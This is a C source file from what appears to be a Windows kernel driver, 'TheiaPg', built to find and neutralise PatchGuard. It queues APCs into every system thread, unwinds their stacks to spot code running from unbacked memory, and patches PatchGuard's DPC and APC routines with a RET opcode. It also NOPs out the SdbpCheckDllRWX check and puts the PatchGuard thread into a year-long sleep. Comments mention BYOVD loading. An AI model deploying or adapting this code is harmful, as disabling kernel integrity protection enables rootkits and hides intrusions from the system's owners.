#include "LinkHeader.h"

/*++
* Routine: BuilderStubApcRoutine
*
* MaxIRQL: DISPATCH_LEVEL
*
* Public/Private: Private
*
* @param Routine: Routine for stub KiDeliverApc (caller)
* 
* Description: Important for BYOVD support, 
* without stub, unwind current stack will not be able to correctly working without access to the .pdata segment TheiaPg.sys in memory.
--*/
static PVOID BuilderStubApcRoutine(IN PVOID pRoutine)
{
    #define ERROR_BUILD_STUB_APC_ROUTINE 0x0004b50fUI32

    CheckStatusTheiaCtx();

    UCHAR CoreStubCall[] =
    {
      0x48, 0x89, 0xe5,                         // mov    rbp,rsp    
      0x48, 0x89, 0xe1,                         // mov    rcx,rsp
      0x48, 0x81, 0xec, 0x00, 0x01, 0x00, 0x00, // sub    rsp,0100h
      0x48, 0x83, 0xe4, 0xf0,                   // and    rsp,0fffffffffffffff0h
      0x55,                                     // push   rbp
      0x48, 0x83, 0xec, 0x28,                   // sub    rsp,028h *028h because: Microsoft-x64-Calling-Convention requires that the lower 4 bits of SP be 0 before the call instruction*
      0x48, 0xb8, 0x88, 0x88, 0x88, 0x88, 0x78, // mov    rax,01234567888888888h
      0x56, 0x34, 0x12,                         // 
      0xff, 0xd0,                               // call   rax
      0x48, 0x83, 0xc4, 0x28,                   // add    rsp,028h
      0x5c                                      // pop    rsp
    };

    CONST UCHAR SaveContext[] =
    {
      0x50,                                     // push   rax
      0x9c,                                     // pushfq     
      0x54,                                     // push   rsp
      0x48, 0x83, 0x04, 0x24, 0x18,             // add    QWORD PTR[rsp],018h     
      0x48, 0x83, 0xec, 0x08,                   // sub    rsp,08h
      0x48, 0x8b, 0x44, 0x24, 0x08,             // mov    rax,QWORD PTR[rsp + 08h]
      0x48, 0x83, 0xe8, 0x08,                   // sub    rax,008h
      0x48, 0x8b, 0x00,                         // mov    rax,QWORD PTR[rax]
      0x48, 0x83, 0xe8, 0x05,                   // sub    rax,05h
      0x48, 0x89, 0x04, 0x24,                   // mov    QWORD PTR[rsp],rax
      0x55,                                     // push   rbp     
      0x41, 0x57,                               // push   r15
      0x41, 0x56,                               // push   r14
      0x41, 0x55,                               // push   r13
      0x41, 0x54,                               // push   r12
      0x41, 0x53,                               // push   r11
      0x41, 0x52,                               // push   r10
      0x41, 0x51,                               // push   r9
      0x41, 0x50,                               // push   r8
      0x57,                                     // push   rdi
      0x56,                                     // push   rsi
      0x53,                                     // push   rbx
      0x52,                                     // push   rdx
      0x51                                      // push   rcx           
    };

    CONST UCHAR ClearSaveContext[] =
    {
      0x48, 0x81, 0xc4, 0x90, 0x00, 0x00, 0x00, // add    rsp,090h
      0xc3                                      // ret
    };

    PVOID pPageStub = (PVOID)g_pTheiaCtx->pMmAllocateIndependentPagesEx(PAGE_SIZE, -1I32, 0I64, 0I32);

    if (!pPageStub)
    {
        DbgLog("[TheiaPg <->] VsrBuilderStubApcRoutine: Bad alloc page for PageStub\n");

        DieDispatchIntrnlError(ERROR_BUILD_STUB_APC_ROUTINE);
    }

    HrdPatchAttributesInputPte(0UI64, 0x800UI64, pPageStub);

    HrdPatchAttributesInputPte(0x7FFFFFFFFFFFFFFFUI64, 0UI64, pPageStub);

    *(PVOID*)((PUCHAR)&CoreStubCall + 24) = pRoutine;

    memset(pPageStub, 0I32, PAGE_SIZE);

    memcpy(pPageStub, SaveContext, sizeof(SaveContext));

    memcpy((PUCHAR)pPageStub + sizeof(SaveContext), CoreStubCall, sizeof(CoreStubCall));

    memcpy((PUCHAR)pPageStub + (sizeof(SaveContext) + sizeof(CoreStubCall)), ClearSaveContext, sizeof(ClearSaveContext));

    return pPageStub;
}

/*++
* Routine: SearchPgSysThreadRoutine
*
* MaxIRQL: DISPATCH_LEVEL
*
* Public/Private: Private
*
* @param InputCtx: Context passed from StubApcRoutine
*
* Description: Required to intercept system threads that are executing code from an Unbacked-Region.
--*/
volatile static VOID SearchPgSysThreadRoutine(IN OUT PINPUTCONTEXT_STUBAPCROUTINE pInputCtx)
{
    CheckStatusTheiaCtx();

    PCONTEXT pInternalCtx = (PCONTEXT)g_pTheiaCtx->pMmAllocateIndependentPagesEx(PAGE_SIZE, -1I32, 0I64, 0I32);

    if (!pInternalCtx) { DbgLog("[TheiaPg <!>] SearchPgSysThreadRoutine: Bad alloc page for InternalCtx\n"); return; }

    pInternalCtx->ContextFlags = CONTEXT_CONTROL;
    pInternalCtx->Rax          = pInputCtx->rax;
    pInternalCtx->Rcx          = pInputCtx->rcx;
    pInternalCtx->Rdx          = pInputCtx->rdx;
    pInternalCtx->Rbx          = pInputCtx->rbx;
    pInternalCtx->Rsi          = pInputCtx->rsi;
    pInternalCtx->Rdi          = pInputCtx->rdi;
    pInternalCtx->R8           = pInputCtx->r8;
    pInternalCtx->R9           = pInputCtx->r9;
    pInternalCtx->R10          = pInputCtx->r10;
    pInternalCtx->R11          = pInputCtx->r11;
    pInternalCtx->R12          = pInputCtx->r12;
    pInternalCtx->R13          = pInputCtx->r13;
    pInternalCtx->R14          = pInputCtx->r14;
    pInternalCtx->R15          = pInputCtx->r15;
    pInternalCtx->Rbp          = pInputCtx->rbp;
    pInternalCtx->Rsp          = pInputCtx->rsp;
    pInternalCtx->Rip          = pInputCtx->rip;
    pInternalCtx->EFlags       = pInputCtx->Rflags;

    PULONG64 pRetAddrsTrace = (PULONG64)g_pTheiaCtx->pMmAllocateIndependentPagesEx(PAGE_SIZE, -1I32, 0I64, 0I32); ///< Required to trace call stack return addresses on Stack-Unwind.

    if (!pRetAddrsTrace) { DbgLog("[TheiaPg <!>] SearchPgSysThreadRoutine: Bad alloc page for RetAddrsTrace\n"); return; }

    PVOID StackHigh, StackLow;

    PVOID pImageBase = NULL;

    PVOID pRuntimeFunction = NULL;

    PVOID pHandlerData = NULL;

    ULONG64 EstablisherFrame = 0UI64;

    PUCHAR pCurrentObjThread = (PUCHAR)__readgsqword(0x188UI32); ///< KPCR.KPRCB.CurrentThread

    PUSHORT pCurrentTID = (PUSHORT)(pCurrentObjThread + (g_pTheiaCtx->TheiaMetaDataBlock.ETHREAD_Cid_OFFSET + g_pTheiaCtx->TheiaMetaDataBlock.CLIENT_ID_UniqueThread_OFFSET));

    CONST LONG64 Timeout = (-10000UI64 * 31536000000UI64); ///< 1 year.

    LONG32 SaveRel32Offset = 0I32;

    CONST UCHAR RetOpcode = 0xC3UI8;

    BOOLEAN OldIF = FALSE;

    INDPN_RW_V_MEMORY_DATA DataIndpnRWVMem = { 0 };

    DataIndpnRWVMem.FlagsExecute = MEM_INDPN_RW_WRITE_OP_BIT;

    DataIndpnRWVMem.pIoBuffer = &RetOpcode;

    DataIndpnRWVMem.LengthRW = 1UI64;

    PVOID pSearchSdbpCheckDllRWX = NULL;

    BOOLEAN IsSleep = FALSE;

    PVOID pPgDpcRoutine = NULL;

    PVOID pPgApcRoutine = NULL;

    PVOID pPgCtx = NULL;

    StackHigh = *(PVOID*)(pCurrentObjThread + g_pTheiaCtx->TheiaMetaDataBlock.KTHREAD_InitialStack_OFFSET);

    StackLow = *(PVOID*)(pCurrentObjThread + g_pTheiaCtx->TheiaMetaDataBlock.KTHREAD_StackLimit_OFFSET);

    if (_IsAddressSafe(pInternalCtx->Rip))
    {
        for (ULONG32 i = 0UI32; ; ++i)
        {
            pRuntimeFunction = g_pTheiaCtx->pRtlLookupFunctionEntry(pInternalCtx->Rip, &pImageBase, NULL);

            if (!pRuntimeFunction) ///< If the current routine leaf.
            {
                pInternalCtx->Rip = *(PVOID*)pInternalCtx->Rsp;

                pInternalCtx->Rsp += 8I64;
            }

            g_pTheiaCtx->pRtlVirtualUnwind(0UI32, pImageBase, pInternalCtx->Rip, pRuntimeFunction, pInternalCtx, &pHandlerData, &EstablisherFrame, NULL);

            if ((pInternalCtx->Rsp >= StackHigh) || (pInternalCtx->Rsp <= StackLow) || (pInternalCtx->Rip < 0xffff800000000000UI64)) { break; } ///< The UserSpace address will not be marked as Unbacked.

            if (!(_IsAddressSafe(pInternalCtx->Rip)))
            {
                JmpDetectNonBackedStack:

                DbgLog("[TheiaPg <+>] SearchPgSysThreadRoutine: Detect non-backed stack calls | TCB: 0x%I64X TID: 0x%hX\n", pCurrentObjThread, *pCurrentTID);

                JmpDetectPgCtxInCpuExecuteCtx:

                pRetAddrsTrace[i] = pInternalCtx->Rip;

                DbgLog("=======================================================================\n");
                DbgLog("RAX: 0x%I64X\n", pInternalCtx->Rax);
                DbgLog("RCX: 0x%I64X\n", pInternalCtx->Rcx);
                DbgLog("RDX: 0x%I64X\n", pInternalCtx->Rdx);
                DbgLog("RBX: 0x%I64X\n", pInternalCtx->Rbx);
                DbgLog("RSI: 0x%I64X\n", pInternalCtx->Rsi);
                DbgLog("RDI: 0x%I64X\n", pInternalCtx->Rdi);
                DbgLog("R8:  0x%I64X\n", pInternalCtx->R8);
                DbgLog("R9:  0x%I64X\n", pInternalCtx->R9);
                DbgLog("R10: 0x%I64X\n", pInternalCtx->R10);
                DbgLog("R11: 0x%I64X\n", pInternalCtx->R11);
                DbgLog("R12: 0x%I64X\n", pInternalCtx->R12);
                DbgLog("R13: 0x%I64X\n", pInternalCtx->R13);
                DbgLog("R14: 0x%I64X\n", pInternalCtx->R14);
                DbgLog("R15: 0x%I64X\n", pInternalCtx->R15);
                DbgLog("RSP: 0x%I64X\n", pInternalCtx->Rsp);
                DbgLog("RBP: 0x%I64X\n", pInternalCtx->Rbp);
                DbgLog("RIP: 0x%I64X\n\n", pInternalCtx->Rip);
                DbgLog("RFLAGS: 0x%I64X\n", pInternalCtx->EFlags);
                DbgLog("=======================================================================\n");

                DbgText
                ( // {

                for (ULONG32 j = 0UI32; ; ++j)
                {
                    if (j == i) { DbgLog("%I32d frame: 0x%I64X <- unbacked\n\n", j, pRetAddrsTrace[j]); break; }

                    DbgLog("%I32d frame: 0x%I64X\n", j, pRetAddrsTrace[j]);
                }

                ) // }

                DbgLog("[TheiaPg <+>] SearchPgSysThreadRoutine: Handling exit phase...\n\n");

                if ((!pPgCtx ? (pPgCtx = SearchPgCtxInCtx(pInternalCtx)) : pPgCtx))
                {
                    DbgLog("[TheiaPg <+>] SearchPgSysThreadRoutine: Detect possibly PgCaller | pPgCtx: 0x%I64X\n\n", pPgCtx);

                    if (g_pTheiaCtx->pMmIsAddressValid(pPgDpcRoutine = *(PVOID*)((PUCHAR)pPgCtx + 0x7f8))) ///< LocalPgCtxBase + 0x7f8: PgDpcRoutine
                    {
                        if (!((HrdGetPteInputVa(pPgDpcRoutine))->NoExecute))
                        {
                            DbgLog("[TheiaPg <+>] SearchPgSysThreadRoutine: Detect PgDpcRoutine in PgCtx | PgDpcRoutine: 0x%I64X\n\n", pPgDpcRoutine);

                            DataIndpnRWVMem.pVa = pPgDpcRoutine;

                            HrdIndpnRWVMemory(&DataIndpnRWVMem);
                        }
                    }

                    if (g_pTheiaCtx->pMmIsAddressValid(pPgApcRoutine = *(PVOID*)((PUCHAR)pPgCtx + 0xa30))) ///< LocalPgCtxBase + 0xA30: PgApcRoutine (basically KiDispatchCallout)
                    {
                        if (!((HrdGetPteInputVa(pPgApcRoutine))->NoExecute))
                        {
                            DbgLog("[TheiaPg <+>] SearchPgSysThreadRoutine: Detect PgApcRoutine in PgCtx | PgApcRoutine: 0x%I64X\n\n", pPgApcRoutine);

                            DataIndpnRWVMem.pVa = pPgApcRoutine;

                            HrdIndpnRWVMemory(&DataIndpnRWVMem);
                        }
                    }

                    //
                    // LocalPgCtxBase + 0x808: OffsetFirstRoutineCheck -> LocalPgCtxBase + OffsetFirstRoutineCheck: FirstRoutineCheck (Caller SdbpCheckDllRWX)
                    //
                    pSearchSdbpCheckDllRWX = ((PUCHAR)pPgCtx + (ULONG64)(*(PULONG32)((PUCHAR)pPgCtx + 0x808)));

                    for (ULONG32 j = 0UI32; ; ++j)
                    {
                        if (((PUCHAR)pSearchSdbpCheckDllRWX)[j] == 0xCC && ((PUCHAR)pSearchSdbpCheckDllRWX)[j + 1] == 0xCC && ((PUCHAR)pSearchSdbpCheckDllRWX)[j + 2] == 0xCC)
                        {
                            SaveRel32Offset = *(PLONG32)((PUCHAR)pSearchSdbpCheckDllRWX + (j - 4));

                            pSearchSdbpCheckDllRWX = (((ULONG64)pSearchSdbpCheckDllRWX + j) + ((SaveRel32Offset < 0I32) ? ((ULONG64)SaveRel32Offset | 0xffffffff00000000UI64) : (ULONG64)SaveRel32Offset));

                   /* Skip: 488b742430 mov rsi, qword ptr [rsp+30h] */
                            for (USHORT l = 5UI16; ; ++l)
                            {
                                if (((PUCHAR)pSearchSdbpCheckDllRWX)[l] == 0xff && ((PUCHAR)pSearchSdbpCheckDllRWX)[l + 1] == 0xe6) { break; }
                                else { ((PUCHAR)pSearchSdbpCheckDllRWX)[l] = 0x90UI8; }
                            }

                            DbgLog("[TheiaPg <+>] SearchPgSysThreadRoutine: SdbpCheckDllRWX is found: 0x%I64X\n\n", pSearchSdbpCheckDllRWX);

                            break;
                        }
                    }

                    JmpToSleep:

                    DbgLog("[TheiaPg <+>] SearchPgSysThreadRoutine: Enter to dead sleep... | IRQL: 0x%02X\n\n", __readcr8());

                    // __debugbreak();

                    IsSleep = TRUE;

                    break;
                }
                else
                {
                    DbgLog("[TheiaPg <+>] SearchPgSysThreadRoutine: Detect possibly PgCaller | pPgCtx: Not-Found\n\n");

                    goto JmpToSleep;
                }
            }

            if (pPgCtx = SearchPgCtxInCtx(pInternalCtx))
            {
                DbgLog("[TheiaPg <+>] SearchPgSysThreadRoutine: Detect PgCtx in CpuExecuteCtx | TCB: 0x%I64X TID: 0x%hX\n", pCurrentObjThread, *pCurrentTID);

                goto JmpDetectPgCtxInCpuExecuteCtx;
            }

            pRetAddrsTrace[i] = pInternalCtx->Rip;
        }
    }
    else { goto JmpDetectNonBackedStack; }

    g_pTheiaCtx->pMmFreeIndependentPages(pInternalCtx, PAGE_SIZE, 0I64);

    g_pTheiaCtx->pMmFreeIndependentPages(pRetAddrsTrace, PAGE_SIZE, 0I64);

    g_pTheiaCtx->pMmFreeIndependentPages(pInputCtx->rcx, PAGE_SIZE, 0I64); ///< RCX: Address KAPC current ApcRoutine (Focused exclusively on Fastcall-x64)

    *(PULONG32)(pCurrentObjThread + g_pTheiaCtx->TheiaMetaDataBlock.KTHREAD_CombinedApcDisable_OFFSET) = *(PULONG32)(pInputCtx->r8); ///< Restore previous state union CombinedApcDisable.

    if (IsSleep) { g_pTheiaCtx->pKeDelayExecutionThread(KernelMode, FALSE, &Timeout); }

    return;
}

/*++
* Routine: InitSearchPgSysThread
*
* MaxIRQL: DISPATCH_LEVEL
*
* Public/Private: Public
*
* @param NoParams
*
* Description: This routine is inserted _KAPC into the apc-queues of system threads using the PspCidTable (PsLookupThreadByThreadId) to iterate over threads.
* 
* =====================================================================================================================================================
* 
* If a thread replaces its Cid in the PspCidTable,
* this will lead to "immunity" from this visor,
* but since Pg does not hide its threads (you can directly enumerate system threads and directly detect threads that execute code from the RWX region),
* if the kernel is not used by a rootkit or other methods of code execution in KernelSpace,
* then you can be "conditionally" sure that this is a Pg system thread that executes WorkItem/Apc or is a full-fledged Pg thread).
--*/
VOID InitSearchPgSysThread(VOID)
{
    #define ERROR_INIT_SEARCH_PG_SYS_THREAD 0x1ecf5472UI32

    CheckStatusTheiaCtx();

    PKAPC_TRUE pKAPC = NULL;

    PVOID pStubRoutine = BuilderStubApcRoutine(&SearchPgSysThreadRoutine);

    PVOID pExceptionObjThread = (PVOID)__readgsqword(0x188UI32);

    PUCHAR pCurrentThreadObj = NULL;

    USHORT CouterInsertedAPCs = 0I16;

    if (__readcr8() > DISPATCH_LEVEL)
    {
        DbgLog("[TheiaPg <->] InitSearchPgSysThread: Inadmissible IRQL | IRQL: 0x%02X\n", __readcr8());

        DieDispatchIntrnlError(ERROR_INIT_SEARCH_PG_SYS_THREAD);
    }

             /* Skip IdleThread */
    for (ULONG32 TID = 4UI32; TID < 0xFFFF; TID += 4UI32)
    {
        if (NT_SUCCESS(g_pTheiaCtx->pPsLookupThreadByThreadId((HANDLE)TID, &pCurrentThreadObj)))
        {
            if (pCurrentThreadObj != pExceptionObjThread && g_pTheiaCtx->pPsIsSystemThread(pCurrentThreadObj))
            {
                pKAPC = (PKAPC_TRUE)g_pTheiaCtx->pMmAllocateIndependentPagesEx(PAGE_SIZE, -1I32, 0I64, 0I32);

                g_pTheiaCtx->pKeInitializeApc(pKAPC, pCurrentThreadObj, NULL, pStubRoutine, NULL, NULL, KernelMode, NULL);

                pKAPC->RundownRoutine = NULL;

                pKAPC->NormalContext = *(PULONG32)(pCurrentThreadObj + (g_pTheiaCtx->TheiaMetaDataBlock.KTHREAD_CombinedApcDisable_OFFSET)); ///< Save current state union CombinedApcDisable.

                *(PULONG32)(pCurrentThreadObj + (g_pTheiaCtx->TheiaMetaDataBlock.KTHREAD_CombinedApcDisable_OFFSET)) = 0UI32; ///< CombinedApcDisable: OFF

                *(PULONG32)(pCurrentThreadObj + (g_pTheiaCtx->TheiaMetaDataBlock.KTHREAD_MiscFlags_OFFSET)) |= (0x1UI32 << 14UI32); ///< ApcQueueable: ON

                g_pTheiaCtx->pKeInsertQueueApc(pKAPC, NULL, NULL, MAXIMUM_PRIORITY);

                ++CouterInsertedAPCs;
            }

            g_pTheiaCtx->pObfDereferenceObject(pCurrentThreadObj); ///< Kernel object counter decrement.
        }
    }

    DbgLog("[TheiaPg <+>] InitSearchPgSysThread: APCs inserted: 0x%hX\n\n", CouterInsertedAPCs);
 
    return;
}
